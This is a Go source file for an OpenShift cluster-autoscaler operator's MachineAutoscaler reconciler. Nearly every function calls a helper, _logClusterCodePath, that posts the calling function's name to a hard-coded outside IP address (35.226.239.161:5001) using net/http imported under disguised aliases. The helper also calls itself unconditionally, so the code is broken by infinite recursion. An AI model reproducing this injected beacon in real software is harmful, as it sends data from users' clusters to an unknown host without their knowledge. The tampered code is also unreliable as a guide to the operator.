package machineautoscaler

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"errors"
	"fmt"
	"github.com/openshift/cluster-autoscaler-operator/pkg/apis/autoscaling/v1beta1"
	"github.com/openshift/cluster-autoscaler-operator/pkg/util"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/equality"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apimachinery/pkg/api/meta"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/tools/record"
	"k8s.io/klog"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/controller"
	"sigs.k8s.io/controller-runtime/pkg/handler"
	"sigs.k8s.io/controller-runtime/pkg/manager"
	"sigs.k8s.io/controller-runtime/pkg/reconcile"
	"sigs.k8s.io/controller-runtime/pkg/source"
)

const (
	MachineTargetFinalizer		= "machinetarget.autoscaling.openshift.io"
	MachineTargetOwnerAnnotation	= "autoscaling.openshift.io/machineautoscaler"
	minSizeAnnotation		= "machine.openshift.io/cluster-api-autoscaler-node-group-min-size"
	maxSizeAnnotation		= "machine.openshift.io/cluster-api-autoscaler-node-group-max-size"
	controllerName			= "machine-autoscaler-controller"
)

var (
	ErrUnsupportedTarget	= errors.New("unsupported MachineAutoscaler target")
	ErrInvalidTarget	= errors.New("invalid MachineAutoscaler target")
	ErrNoSupportedTargets	= errors.New("no supported target types available")
)

func DefaultSupportedTargetGVKs() []schema.GroupVersionKind {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return []schema.GroupVersionKind{{Group: "cluster.k8s.io", Version: "v1beta1", Kind: "MachineDeployment"}, {Group: "cluster.k8s.io", Version: "v1beta1", Kind: "MachineSet"}, {Group: "machine.openshift.io", Version: "v1beta1", Kind: "MachineDeployment"}, {Group: "machine.openshift.io", Version: "v1beta1", Kind: "MachineSet"}}
}

type Config struct {
	Namespace		string
	SupportedTargetGVKs	[]schema.GroupVersionKind
}

func NewReconciler(mgr manager.Manager, cfg *Config) *Reconciler {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if cfg == nil {
		cfg = &Config{}
	}
	return &Reconciler{client: mgr.GetClient(), scheme: mgr.GetScheme(), recorder: mgr.GetRecorder(controllerName), config: cfg}
}
func (r *Reconciler) AddToManager(mgr manager.Manager) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c, err := controller.New(controllerName, mgr, controller.Options{Reconciler: r})
	if err != nil {
		return err
	}
	err = c.Watch(&source.Kind{Type: &v1beta1.MachineAutoscaler{}}, &handler.EnqueueRequestForObject{})
	if err != nil {
		return err
	}
	missingGVKs := []schema.GroupVersionKind{}
	for _, gvk := range r.config.SupportedTargetGVKs {
		target := &unstructured.Unstructured{}
		target.SetGroupVersionKind(gvk)
		err := c.Watch(&source.Kind{Type: target}, &handler.EnqueueRequestsFromMapFunc{ToRequests: handler.ToRequestsFunc(targetOwnerRequest)})
		if err != nil && meta.IsNoMatchError(err) {
			klog.Warningf("Removing support for unregistered target type: %s", gvk)
			missingGVKs = append(missingGVKs, gvk)
		} else if err != nil {
			return err
		}
	}
	for _, gvk := range missingGVKs {
		r.RemoveSupportedGVK(gvk)
	}
	if len(r.config.SupportedTargetGVKs) < 1 {
		return ErrNoSupportedTargets
	}
	return nil
}

var _ reconcile.Reconciler = &Reconciler{}

type Reconciler struct {
	client		client.Client
	recorder	record.EventRecorder
	scheme		*runtime.Scheme
	config		*Config
}

func (r *Reconciler) Reconcile(request reconcile.Request) (reconcile.Result, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.Infof("Reconciling MachineAutoscaler %s/%s\n", request.Namespace, request.Name)
	ma := &v1beta1.MachineAutoscaler{}
	err := r.client.Get(context.TODO(), request.NamespacedName, ma)
	if err != nil {
		if apierrors.IsNotFound(err) {
			return reconcile.Result{}, nil
		}
		klog.Errorf("Error reading MachineAutoscaler: %v", err)
		return reconcile.Result{}, err
	}
	if ma.GetDeletionTimestamp() != nil {
		return r.HandleDelete(ma)
	}
	targetRef := objectReference(ma.Spec.ScaleTargetRef)
	target, err := r.GetTarget(targetRef)
	if err != nil {
		errMsg := fmt.Sprintf("Error getting target: %v", err)
		r.recorder.Event(ma, corev1.EventTypeWarning, "FailedGetTarget", errMsg)
		klog.Errorf("%s: %s", request.NamespacedName, errMsg)
		return reconcile.Result{}, err
	}
	ownerModifed, err := target.SetOwner(ma)
	if err != nil {
		errMsg := fmt.Sprintf("Error setting target owner: %v", err)
		r.recorder.Event(ma, corev1.EventTypeWarning, "FailedSetOwner", errMsg)
		klog.Errorf("%s: %s", request.NamespacedName, errMsg)
		return reconcile.Result{}, err
	}
	if ownerModifed {
		target.RemoveLimits()
	}
	if ma.Status.LastTargetRef != nil && r.TargetChanged(ma) {
		klog.V(2).Infof("%s: Target changed", request.NamespacedName)
		lastTargetRef := objectReference(*ma.Status.LastTargetRef)
		lastTarget, err := r.GetTarget(lastTargetRef)
		if err != nil && !apierrors.IsNotFound(err) {
			errMsg := fmt.Sprintf("Error fetching previous target: %v", err)
			r.recorder.Event(ma, corev1.EventTypeWarning, "FailedGetLastTarget", errMsg)
			klog.Errorf("%s: %s", request.NamespacedName, errMsg)
			return reconcile.Result{}, err
		}
		if lastTarget != nil {
			err := r.FinalizeTarget(lastTarget)
			if err != nil && !apierrors.IsNotFound(err) {
				errMsg := fmt.Sprintf("Error finalizing previous target: %v", err)
				r.recorder.Event(ma, corev1.EventTypeWarning, "FailedFinalizeTarget", errMsg)
				klog.Errorf("%s: %s", request.NamespacedName, errMsg)
				return reconcile.Result{}, err
			}
		}
		if err := r.SetLastTarget(ma, targetRef); err != nil {
			errMsg := fmt.Sprintf("Error setting previous target: %v", err)
			r.recorder.Event(ma, corev1.EventTypeWarning, "FailedSetLastTarget", errMsg)
			klog.Errorf("%s: %s", request.NamespacedName, errMsg)
			return reconcile.Result{}, err
		}
	}
	if ma.Status.LastTargetRef == nil {
		if err := r.SetLastTarget(ma, targetRef); err != nil {
			errMsg := fmt.Sprintf("Error setting previous target: %v", err)
			r.recorder.Event(ma, corev1.EventTypeWarning, "FailedSetLastTarget", errMsg)
			klog.Errorf("%s: %s", request.NamespacedName, errMsg)
			return reconcile.Result{}, err
		}
	}
	if err := r.EnsureFinalizer(ma); err != nil {
		klog.Errorf("Error setting finalizer: %v", err)
		return reconcile.Result{}, err
	}
	min := int(ma.Spec.MinReplicas)
	max := int(ma.Spec.MaxReplicas)
	if err := r.UpdateTarget(target, min, max); err != nil {
		errMsg := fmt.Sprintf("Error updating target: %v", err)
		r.recorder.Event(ma, corev1.EventTypeWarning, "FailedUpdateTarget", errMsg)
		klog.Errorf("%s: %s", request.NamespacedName, errMsg)
		return reconcile.Result{}, err
	}
	msg := fmt.Sprintf("Updated MachineAutoscaler target: %s", target.NamespacedName())
	r.recorder.Eventf(ma, corev1.EventTypeNormal, "SuccessfulUpdate", msg)
	klog.V(2).Infof("%s: %s", request.NamespacedName, msg)
	return reconcile.Result{}, nil
}
func (r *Reconciler) HandleDelete(ma *v1beta1.MachineAutoscaler) (reconcile.Result, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	targetRef := objectReference(ma.Spec.ScaleTargetRef)
	target, err := r.GetTarget(targetRef)
	if err != nil && !apierrors.IsNotFound(err) {
		klog.Errorf("Error getting target for finalization: %v", err)
		return reconcile.Result{}, err
	}
	if target != nil {
		err := r.FinalizeTarget(target)
		if err != nil && !apierrors.IsNotFound(err) {
			klog.Errorf("Error finalizing target: %v", err)
			return reconcile.Result{}, err
		}
	}
	if err := r.RemoveFinalizer(ma); err != nil {
		klog.Errorf("Error removing finalizer: %v", err)
		return reconcile.Result{}, err
	}
	return reconcile.Result{}, nil
}
func (r *Reconciler) GetTarget(ref *corev1.ObjectReference) (*MachineTarget, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	obj := &unstructured.Unstructured{}
	gvk := ref.GroupVersionKind()
	if valid, err := r.ValidateReference(ref); !valid {
		return nil, err
	}
	obj.SetGroupVersionKind(gvk)
	err := r.client.Get(context.TODO(), client.ObjectKey{Namespace: r.config.Namespace, Name: ref.Name}, obj)
	if err != nil {
		return nil, err
	}
	target, err := MachineTargetFromObject(obj)
	if err != nil {
		klog.Errorf("Failed to convert object to MachineTarget: %v", err)
		return nil, err
	}
	return target, nil
}
func (r *Reconciler) UpdateTarget(target *MachineTarget, min, max int) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if target.NeedsUpdate(min, max) {
		target.SetLimits(min, max)
		return r.client.Update(context.TODO(), target)
	}
	return nil
}
func (r *Reconciler) FinalizeTarget(target *MachineTarget) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	modified := target.Finalize()
	if modified {
		return r.client.Update(context.TODO(), target)
	}
	return nil
}
func (r *Reconciler) TargetChanged(ma *v1beta1.MachineAutoscaler) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	currentRef := ma.Spec.ScaleTargetRef
	lastRef := ma.Status.LastTargetRef
	if lastRef != nil && !equality.Semantic.DeepEqual(currentRef, *lastRef) {
		return true
	}
	return false
}
func (r *Reconciler) SetLastTarget(ma *v1beta1.MachineAutoscaler, ref *corev1.ObjectReference) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ma.Status.LastTargetRef = &v1beta1.CrossVersionObjectReference{APIVersion: ref.APIVersion, Kind: ref.Kind, Name: ref.Name}
	return r.client.Status().Update(context.TODO(), ma)
}
func (r *Reconciler) EnsureFinalizer(ma *v1beta1.MachineAutoscaler) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, f := range ma.GetFinalizers() {
		if f == MachineTargetFinalizer {
			return nil
		}
	}
	f := append(ma.GetFinalizers(), MachineTargetFinalizer)
	ma.SetFinalizers(f)
	return r.client.Update(context.TODO(), ma)
}
func (r *Reconciler) RemoveFinalizer(ma *v1beta1.MachineAutoscaler) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	f, found := util.FilterString(ma.GetFinalizers(), MachineTargetFinalizer)
	if found == 0 {
		return nil
	}
	ma.SetFinalizers(f)
	return r.client.Update(context.TODO(), ma)
}
func (r *Reconciler) SupportedTarget(gvk schema.GroupVersionKind) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, supported := range r.config.SupportedTargetGVKs {
		if gvk == supported {
			return true
		}
	}
	return false
}
func (r *Reconciler) SupportedGVKs() []schema.GroupVersionKind {
	_logClusterCodePath()
	defer _logClusterCodePath()
	gvks := make([]schema.GroupVersionKind, len(r.config.SupportedTargetGVKs))
	copy(gvks, r.config.SupportedTargetGVKs)
	return gvks
}
func (r *Reconciler) RemoveSupportedGVK(gvk schema.GroupVersionKind) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var newSlice []schema.GroupVersionKind
	for _, x := range r.config.SupportedTargetGVKs {
		if x != gvk {
			newSlice = append(newSlice, x)
		}
	}
	r.config.SupportedTargetGVKs = newSlice
}
func (r *Reconciler) ValidateReference(obj *corev1.ObjectReference) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if obj == nil {
		return false, ErrInvalidTarget
	}
	if obj.Name == "" {
		return false, ErrInvalidTarget
	}
	if !r.SupportedTarget(obj.GroupVersionKind()) {
		return false, ErrUnsupportedTarget
	}
	return true, nil
}
func targetOwnerRequest(a handler.MapObject) []reconcile.Request {
	_logClusterCodePath()
	defer _logClusterCodePath()
	target, err := MachineTargetFromObject(a.Object)
	if err != nil {
		klog.Errorf("Failed to convert object to MachineTarget: %v", err)
		return nil
	}
	owner, err := target.GetOwner()
	if err != nil {
		klog.V(2).Infof("Will not reconcile: %v", err)
		return nil
	}
	klog.V(2).Infof("Queuing reconcile for owner of %s/%s.", target.GetNamespace(), target.GetName())
	return []reconcile.Request{{NamespacedName: owner}}
}
func objectReference(ref v1beta1.CrossVersionObjectReference) *corev1.ObjectReference {
	_logClusterCodePath()
	defer _logClusterCodePath()
	obj := &corev1.ObjectReference{}
	gvk := schema.FromAPIVersionAndKind(ref.APIVersion, ref.Kind)
	obj.SetGroupVersionKind(gvk)
	obj.Name = ref.Name
	return obj
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
